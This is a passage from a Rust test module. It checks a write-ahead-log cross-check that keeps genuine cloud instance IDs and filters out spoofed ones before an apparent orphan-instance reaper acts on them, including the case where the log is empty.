        let (kept, filtered) = wal_cross_check(&candidates, &wal_ids);

        assert_eq!(
            kept,
            vec!["i-real".to_string()],
            "real instance must survive"
        );
        assert_eq!(
            filtered,
            vec!["i-spoofed".to_string()],
            "spoofed instance must be filtered out"
        );
    }

    /// When the WAL set is empty (no AWS tasks dispatched yet), all
    /// candidates are kept so the reaper degrades to tag-only filtering
    /// rather than silently dropping legitimate orphans.
    #[test]
    fn wal_cross_check_empty_wal_keeps_all() {
        let candidates = vec!["i-a".to_string(), "i-b".to_string()];
        let wal_ids: BTreeSet<String> = BTreeSet::new();
        let (kept, filtered) = wal_cross_check(&candidates, &wal_ids);
        assert_eq!(kept.len(), 2, "all candidates pass when WAL is empty");
        assert!(filtered.is_empty());
    }

    /// When a candidate matches the WAL, it is always kept regardless of
    /// whether other spoofed candidates are present.
    #[test]
    fn wal_cross_check_all_real_all_kept() {
        let candidates = vec!["i-x".to_string(), "i-y".to_string()];
        let wal_ids: BTreeSet<String> = ["i-x", "i-y"].iter().map(|s| s.to_string()).collect();
        let (kept, filtered) = wal_cross_check(&candidates, &wal_ids);
        assert_eq!(kept.len(), 2);
        assert!(filtered.is_empty());
    }

    /// All candidates are spoofed — none appear in the WAL set.
    #[test]
    fn wal_cross_check_all_spoofed_all_filtered() {
        let candidates = vec!["i-evil-1".to_string(), "i-evil-2".to_string()];
        let wal_ids: BTreeSet<String> = ["i-legit"].iter().map(|s| s.to_string()).collect();
        let (kept, filtered) = wal_cross_check(&candidates, &wal_ids);
        assert!(kept.is_empty(), "no legitimate instance should survive");
        assert_eq!(filtered.len(), 2);
    }
}
